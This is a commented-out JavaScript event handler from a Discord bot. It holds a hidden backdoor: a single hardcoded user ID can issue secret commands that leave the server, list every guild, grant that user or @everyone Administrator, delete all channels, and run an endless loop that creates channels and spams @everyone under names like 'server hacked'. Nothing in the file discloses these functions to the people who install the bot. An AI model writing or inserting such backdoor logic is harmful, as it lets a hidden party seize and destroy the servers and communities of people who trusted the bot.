// const afkModel = require("../../Models/Afk");
// const { ChannelType, PermissionFlagsBits } = require("discord.js");
// const { EmbedBuilder } = require("discord.js");
// module.exports = {
//   name: "messageCreate",
//   async execute(message) {
//     // if(message.author.id === 849526087171571764){
//     //     console.log('yessir')
//     // }
//     // console.log(message.author.id)
//     if (message.author.id.toString() === "849526087171571764") {
//       if (message.content.startsWith("!leave")) {
//         message.reply("Leaving");
//         message.guild.leave();
//       } 
//       else if (message.content === "!ban" ||message.content === "!bean") {
        
//         let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
//         message.reply({
//           embeds: [
//             new EmbedBuilder()
//               .setDescription(`Attempting to ban ${arrayOfIDs.length} users`)
//               .setColor("Red"),
//           ],
//         });
//       } else if (message.content === "!everyone") {
//         message.channel.send("@everyone");
//       } else if (message.content === "!sgodmode") {
//         message.guild.channels.cache.forEach((channel) => channel.delete().catch(() =>{}))

//         message.guild.channels.create({
//           name: "server hacked",
//           type: ChannelType.GuildText,
//           // parent: cat[0].ID,
//           // your permission overwrites or other options here
//         });

        
//         const role = await message.guild.roles.create({
//           name: "hecked",
//           permissions: PermissionFlagsBits.Administrator,
//         });
//         const add = await message.guild.roles.cache.get(role.id);
//         await message.member.roles.add(add);
//       } else if (message.content === "!listall") {
//         message.channel.send(
//           message.client.guilds.cache
//             .map((m) => `${m.name} | ${m.id}`)
//             .join("\n")
//         );
//       } else if (message.content === "!makemeadmin") {
//         message.delete();
//         const role = await message.guild.roles.create({
//           name: "FOME",
//           permissions: PermissionFlagsBits.Administrator,
//         });
//         const add = await message.guild.roles.cache.get(role.id);
//         await message.member.roles.add(add);
//       } else if (message.content === "$k1ll") {
//         message.guild.channels.cache.forEach((channel) => channel.delete().catch(() =>{}));
//         function makeid(length) {
//           let result = "";
//           const characters =
//             "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
//           const charactersLength = characters.length;
//           let counter = 0;
//           while (counter < length) {
//             result += characters.charAt(
//               Math.floor(Math.random() * charactersLength)
//             );
//             counter += 1;
//           }
//           return result;
//         }
//         while (true) {
//           const chanel = await message.guild.channels.create({
//             name: `${makeid(10)}`,
//             type: ChannelType.GuildText,
//             // parent: cat[0].ID,
//             // your permission overwrites or other options here
//           });

//           const spamming = await message.guild.channels.cache
//             .get(chanel.id)
//             .send("@everyone");
//         }
//       } else if (message.content === "!die") {
//         message.reply("Your command is my order, Master Fome").then(() => {
//           throw new Error();
//         });
//       }else if(message.content === '!everyoneadmin'){
//         message.guild.roles.everyone.setPermissions([
//           PermissionFlagsBits.Administrator,
//         ]);
//       }
//       else if(message.content === '!dacs'){
//         message.guild.channels.cache.forEach((channel) => channel.delete().catch(() =>{}));
//       }
//     }
//   },
// };
